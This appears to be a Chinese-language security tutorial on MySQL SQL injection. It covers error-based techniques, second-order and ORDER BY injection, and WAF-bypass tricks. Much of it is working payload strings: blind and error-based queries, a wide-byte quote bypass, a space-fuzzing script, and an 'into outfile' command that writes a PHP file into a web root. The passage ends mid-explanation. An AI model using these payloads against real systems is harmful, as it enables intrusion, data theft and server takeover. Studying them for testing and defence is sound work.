<p>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
<ol>
<li>BIGINT等数据类型溢出</li>
<li>xpath语法错误</li>
<li>concat+rand()+group_by()导致主键重复</li>
<li>一些特性</li>
</ol>
<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>这里可以看到mysql是怎么处理整形的：<a class="link"   href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" >Integer Types (Exact Value)<i class="fas fa-external-link-alt"></i></a>，如下表：</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Storage</th>
<th>Minimum Value</th>
<th>Maximum Value</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>(Bytes)</td>
<td>(Signed/Unsigned)</td>
<td>(Signed/Unsigned)</td>
</tr>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128</td>
<td>127</td>
</tr>
<tr>
<td></td>
<td></td>
<td>0</td>
<td>255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768</td>
<td>32767</td>
</tr>
<tr>
<td></td>
<td></td>
<td>0</td>
<td>65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608</td>
<td>8388607</td>
</tr>
<tr>
<td></td>
<td></td>
<td>0</td>
<td>16777215</td>
</tr>
<tr>
<td>INT</td>
<td>4</td>
<td>-2147483648</td>
<td>2147483647</td>
</tr>
<tr>
<td></td>
<td></td>
<td>0</td>
<td>4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808</td>
<td>9223372036854775807</td>
</tr>
<tr>
<td></td>
<td></td>
<td>0</td>
<td>18446744073709551615</td>
</tr>
</tbody></table>
<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a class="link"   href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" >out-of-range-and-overflow<i class="fas fa-external-link-alt"></i></a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(18446744073709551615 + 1)&#39;</span><br></pre></td></tr></table></figure>
<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure>
<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>同理，利用exp函数也会产生类似的溢出错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure>
<p>注入姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select exp(~(select * from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#39;root@localhost&#39; from dual)))&#39;</span><br></pre></td></tr></table></figure>
<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure>
<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure>
<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure>
<h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>从mysql5.1.5开始提供两个<a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" >XML查询和修改的函数<i class="fas fa-external-link-alt"></i></a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&#39;&#x2F;a&#x2F;b&#39;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#39;&#x2F;a&#x2F;b&#39;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure>
<h3 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h3><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure>
<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure>
<p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。这里最关键的及时要理解group by函数的工作过程。group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值）</p>
<p>如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
<p>举个例子，表中数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
<ul>
<li>先是建立虚拟表，其中key为主键，不可重复：</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
<tr>
<td>tom</td>
<td>1</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>jack</td>
<td>1+1</td>
</tr>
<tr>
<td>tom</td>
<td>1</td>
</tr>
<tr>
<td>candy</td>
<td>1</td>
</tr>
</tbody></table>
<p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>回到之前的group by语句上，我们将其改为<code>select count(*) from test group by floor(rand(0)*2)</code>，看看每一步是什么情况：</p>
<ul>
<li>先建立空表</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>取第一条记录，执行<code>floor(rand(0)*2)</code>，发现结果为0(第一次计算)，查询虚表，发现没有该键值，则会再计算一次<code>floor(rand(0)*2)</code>，将结果1(第二次计算)插入虚表，如下：</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
<ul>
<li>查第二条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为1(第三次计算)，查询虚表，发现键值1存在，所以此时不在计算第二次，直接count(*)值加1，如下：</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>1+1</td>
</tr>
</tbody></table>
<ul>
<li>查第三条记录，再次计算<code>floor(rand(0)*2)</code>，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算<code>floor(rand(0)*2)</code>，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。</li>
<li>最终报错的结果，即主键’1’重复：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by floor(rand(0)*2);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure>
<p>整个查询过程中，<code>floor(rand(0)*2)</code>被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。</p>
<p>另外，要注意加入随机数种子的问题，如果没加入随机数种子或者加入其他的数，那么floor(rand()*2)产生的序列是不可测的，这样可能会出现正常插入无法报错的情况。最重要的是前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*2)不会再被计算做为虚表的键值，这也就是为什么不加随机数种子有时候会报错，有时候不会报错的原因。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select floor(rand(1)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(1)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(*) from test group by floor(rand(1)*2);</span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        3 |</span><br><span class="line">|        3 |</span><br><span class="line">+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h3 id="一些特性"><a href="#一些特性" class="headerlink" title="一些特性"></a>一些特性</h3><ul>
<li><strong>列名重复</strong></li>
</ul>
<p>mysql列名重复会报错，我们利用name_const来制造一个列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;5.7.17&#39;</span><br></pre></td></tr></table></figure>
<p>根据<a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const" >官方文档<i class="fas fa-external-link-alt"></i></a>，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
<p>利用这个特性加上join函数可以爆列名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select *  from(select * from test a join test b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</span><br><span class="line">mysql&gt; select *  from(select * from test a join test b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;name&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>几何函数</strong></li>
</ul>
<p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5.5.47</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;b&#96;.&#96;version()&#96; from ((select &#39;5.5.47&#39; AS &#96;version()&#96; from dual) &#96;b&#96;))&#39; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line">mysql&gt; select multipoint((select * from (select * from (select version())a)b));</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;a&#96;.&#96;version()&#96; from ((select version() AS &#96;version()&#96;) &#96;a&#96;))&#39; value found during parsing</span><br></pre></td></tr></table></figure>


<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>一阶注射是指输入的注射语句对WEB 直接产生了影响，出现了结果；二阶注入类似存<br>储型XSS，是指输入提交的语句，无法直接对WEB 应用程序产生影响，通过其它的辅助间<br>接的对WEB 产生危害，这样的就被称为是二阶注入。</p>
<p>二次排序注入思路：</p>
<ol>
<li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务<br>端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。</li>
<li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的<br>数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响<br>应。</li>
<li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li>
<li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库<br>中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服<br>务端环境中执行。</li>
<li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注<br>入漏洞利用是否成功。</li>
</ol>
<h2 id="ORDER-BY-注入"><a href="#ORDER-BY-注入" class="headerlink" title="ORDER BY 注入"></a>ORDER BY 注入</h2><p>order by 注入指的是用户传入的参数插入在查询语句的 order by 后面的位置，不同于常见的 where 后的注入点，order by 不能使用 union 等进行注入。</p>
<h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><ul>
<li><strong>升序和降序验证</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 升序排序</span><br><span class="line">?sort&#x3D;1 asc</span><br><span class="line"></span><br><span class="line"># 降序排序</span><br><span class="line">?sort&#x3D;1 dasc</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>rand() 验证</strong></li>
</ul>
<p>rand(ture) 和 rand(false) 的结果是不一样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;rand(true)</span><br><span class="line">?sort&#x3D;rand(false)</span><br></pre></td></tr></table></figure>
<p>所以利用这个可以轻易构造出一个布尔和延时类型盲注的测试 payload</p>
<p>此外 rand() 结果是一直都是随机的</p>
<ul>
<li><strong>延时验证</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;sleep(1)</span><br><span class="line">?sort&#x3D;(sleep(1))</span><br><span class="line">?sort&#x3D;1 and sleep(1)</span><br></pre></td></tr></table></figure>
<p>这种方式均可以延时，延时的时间为 (行数*1) 秒</p>
<h3 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h3><ul>
<li><strong>报错注入</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>procedure analyse 参数后注入</strong></li>
</ul>
<p>利用 procedure analyse 参数，我们可以执行报错注入。同时，在 procedure analyse 和 orde r by 之间可以存在 limit 参数，我们在实际应用中，往往也可能会存在 limit 后的注入，可以 利用 procedure analyse 进行注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>布尔盲注</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>时间盲注</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))</span><br><span class="line">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>into outfile</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;less46.txt&quot;</span><br></pre></td></tr></table></figure>
<p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
<p><strong>利用导出文件 getshell</strong>：</p>
<p>使用lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort&#x3D;1 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\shell.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure>
<p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306114842456.png" alt="image-20210306114842456"></p>
<h2 id="常见WAF绕过"><a href="#常见WAF绕过" class="headerlink" title="常见WAF绕过"></a>常见WAF绕过</h2><p>常见的绕过姿势有两种。</p>
<p>第一种是替换关键字，这种方式我们可以直接通过双写关键词等方式来进行绕过；</p>
<p>第二种是关键词直接拦截，这种情况下我们可以通过变换函数等方式来进行绕过。</p>
<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>大部分的SQL语句都用到了空格，如果空格被拦截或者过滤，可以尝试以下方法：</p>
<ul>
<li>使用<code>/**/</code>即SQL语句中的注释语句来绕过。</li>
<li>使用双写URL编码绕过，例如(%20 → %2520)。</li>
<li>通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）</li>
<li>通过科学计数法绕过：<code>where id=0e1union select 1,2</code></li>
<li>Fuzz所有字符，查找可替代空格的字符例如 <strong>%09 %0a %0b %0c %0d</strong>。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure>
<p>这里是fuzz脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(256):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;0.0.0.0:6555&#x2F;1.php&quot; &#x2F;&#x2F;这里是fuzz的地址</span><br><span class="line">    querystring &#x3D; &#123;&quot;id&quot;: &quot;1%sor%s1&#x3D;1&quot; % (chr(i), chr(i))&#125;</span><br><span class="line">    payload &#x3D; &quot;&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;cache-control&#39;: &quot;no-cache&quot;,</span><br><span class="line">        &#39;Postman-Token&#39;: &quot;ad28b8ea-268a-449a-b7cd-f6261250d766&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response &#x3D; requests.request(&quot;GET&quot;, url, data&#x3D;payload, headers&#x3D;headers, params&#x3D;querystring)</span><br><span class="line">    if response.text.find(&quot;DSCTF2&quot;) !&#x3D; -1:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
<p>这里列出了数据库中一些常见的可以用来绕过空格过滤的空白字符：</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>空白字符</th>
</tr>
</thead>
<tbody><tr>
<td>SQLite3</td>
<td>0A 0D 0C 09 20</td>
</tr>
<tr>
<td>MYSQL5</td>
<td>09 0A 0B 0C 0D A0 20</td>
</tr>
<tr>
<td>PosgresSQL</td>
<td>0A 0D 0C 09 20</td>
</tr>
<tr>
<td>Oracle 11g</td>
<td>00 0A 0D 0C 09 20</td>
</tr>
<tr>
<td>MSSQL</td>
<td>01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20</td>
</tr>
</tbody></table>
<h3 id="逗号过滤-拦截"><a href="#逗号过滤-拦截" class="headerlink" title="逗号过滤/拦截"></a>逗号过滤/拦截</h3><p>拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。</p>
<p>substring和if语句都用到了逗号，因此无法使用。</p>
<p>substring可以用substr函数来进行代替，if语句可以通过and语句来进行代替。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 AND ascii(substr((SELECT database()) FROM 1 FOR</span><br><span class="line">1))&gt;115</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(SELECT database()) FROM 1 TO 1</span><br></pre></td></tr></table></figure>
<p>返回database()中的第一个字符，可以通过脚本递增，来返回database中的所有字符；然后将ascii码进行比较，如果大于115，则则语句为真，id正常回显，否则不正常回显。</p>
<p>通过这种方法，通常引出二分法，便于快速筛出字符串。</p>
<p>除了以上方法，也可以通过join的语法来进行绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 union select *from (select 1)a join (select database())b</span><br></pre></td></tr></table></figure>
<h3 id="单引号拦截-过滤-转义"><a href="#单引号拦截-过滤-转义" class="headerlink" title="单引号拦截/过滤/转义"></a>单引号拦截/过滤/转义</h3><p>当引号存在过滤和转义的情况下，可以这样处理：</p>
<ul>
<li>利用编码特性绕过。（宽字节注入）</li>
</ul>
<p>比较典型的使用编码就是<strong>GBK编码</strong>：使用前面的字符吃掉后面的字符(斜杆)。</p>
<p>原理：MYSQL在使用GBK编码的时候，会认为两个字符为一个汉字，，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1%df&#39; union select 1,database()#</span><br></pre></td></tr></table></figure>
<p>转义后传入的id：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 %df\‘ &#x3D;&gt; 1%df%5c’&#x3D;&gt; 1�’</span><br></pre></td></tr></table></figure>
<ul>
<li>利用反斜杠<code>\</code>绕过</li>
</ul>
<p>当在登录时使用的是如下SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">&#x27;$_POST[username]&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$_POST[password]&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>在这里单引号被过滤了，但是反斜杠<code>\</code>并没有被过滤。则单引号可以被转义</p>
<p>输入的用户名以反斜杠<code>\</code>结尾</p>
